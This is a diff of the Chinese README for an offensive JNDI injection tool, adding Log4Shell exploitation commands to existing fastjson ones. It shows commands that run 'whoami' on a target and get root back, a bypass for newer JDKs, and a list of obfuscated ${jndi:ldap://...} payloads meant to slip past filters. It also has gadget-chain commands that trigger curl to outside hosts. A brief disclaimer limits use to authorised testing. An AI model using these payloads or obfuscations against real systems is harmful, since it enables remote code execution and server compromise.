@@ -3,7 +3,7 @@
 ```
 声明： 此工具仅用于企业安全人员自查验证自身企业资产的安全风险，或有合法授权的安全测试，请勿用于其他用途，如有，后果自负。
 
-download_url : https://toolaffix.oss-cn-beijing.aliyuncs.com/jndi_tool.zip
+download_url : https://toolaffix.oss-cn-beijing.aliyuncs.com/jndi_tool.jar
 
 > java -jar jndi_tool.jar 
 Usage:
@@ -21,9 +21,52 @@ java -cp jndi_tool.jar jndi.fastjson.LDAPRefServerAuto 127.0.0.1 1099 file=filen
 java -cp jndi_tool.jar jndi.fastjson.BCELEncode "curl dnslog.wyzxxz.cn"
 java -cp jndi_tool.jar jndi.fastjson.Tamper  "{\"abc\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1099/Object\",\"autoCommit\":true}}" 
 
+log4j:
+java -cp jndi_tool.jar jndi.log4j.HLDAPLog4j 127.0.0.1 80 "whoami" http://target  w=tomcat/groory/http  default:http
+java -cp jndi_tool.jar jndi.log4j.HLDAPLog4jAuto 127.0.0.1 1099 url=http://xxx
+java -cp jndi_tool.jar jndi.log4j.Tamper "${jndi:ldap://127.0.0.1/a}" all=true random=true
+
+
+
+1. 新增LOG4J相关检测
+> java -cp jndi_tool.jar jndi.log4j.HLDAPLog4j xx.xx.xx.xx 80 "whoami" http://xx.xx.xx:8080/
+[-] payload:  ${jndi:ldap://xx.xx.xx.xx/x}
+[-] LDAP Listening on 0.0.0.0:80
+[*] Have connection from /xx.xx.xx.xx:34850 /EvilObject.class
+[-] remote target jdk version: java/1.8.0_131, use payload version: jdk8
+[-] send payload done
+[-] waiting result...
+result: 
+root
+
+> java -cp jndi_tool.jar jndi.log4j.HLDAPLog4j xx.xx.xx.xx 80 "whoami" http://xx.xx.xx:8080/ w=tomcat  // 高版本jdk的绕过，依赖el
+[-] payload:  ${jndi:ldap://xx.xx.xx.xx/x}
+[-] LDAP Listening on 0.0.0.0:80
+[-] start exploit.
+[-] input class: tomcat, command: curl xx.xx.xx
+[*] Send data...
+
+
+> java -cp jndi_tool.jar jndi.log4j.Tamper "\${jndi:ldap://127.0.0.1/a}"  random=true
+[-] process all string is: False
+[-] random process string is: True
+--------------------------------------------------
+${jndi:ldap://127.0.0.1/a}
+${j${upper:n}d${upper:i}:l${upper:d}${upper:a}p://127.0.0.1/a}
+${j${upper:n}d${upper:${upper:谋}}:l${upper:d}${upper:a}p://127.0.0.1/a}
+${j${lower:n}d${lower:i}:l${lower:d}${lower:a}p://127.0.0.1/a}
+${j${::-n}d${::-i}:l${::-d}${::-a}p://127.0.0.1/a}
+${j${Omhc:qBz:-n}d${b:Hz:-i}:l${vX::-d}${puF:A:-a}p://127.0.0.1/a}
+${j${Ez:mk:cHK:Xwn::-n}d${TXjk:LN:vBjQ::-i}:l${Nz:Of:bfDt:AgIH:-d}${TDN:SchK:uWu::-a}p://127.0.0.1/a}
+${j${lower:${lower:n}}d${lower:${lower:${lower:${lower:i}}}}:l${lower:${lower:${lower:d}}}${lower:${lower:${lower:${lower:a}}}}p://127.0.0.1/a}
+${j${upper:${upper:${upper:n}}}d${upper:${upper:${upper:${upper:i}}}}:l${upper:${upper:d}}${upper:${upper:a}}p://127.0.0.1/a}
+${j${lower:${lower:${lower:${lower:n}}}}d${upper:${lower:${upper:i}}}:l${lower:d}${upper:${upper:${lower:a}}}p://127.0.0.1/a}
 
 
 2. 优化 jndi.LDAPRefServer，支持gadget/command形式，例如 ldap://xx.xx.xx.xx:1099/CommonsCollections1/curl x.com"
+具体执行 java -cp jndi_tool.jar jndi.LDAPRefServer 1099查看
+
+
 
 
 
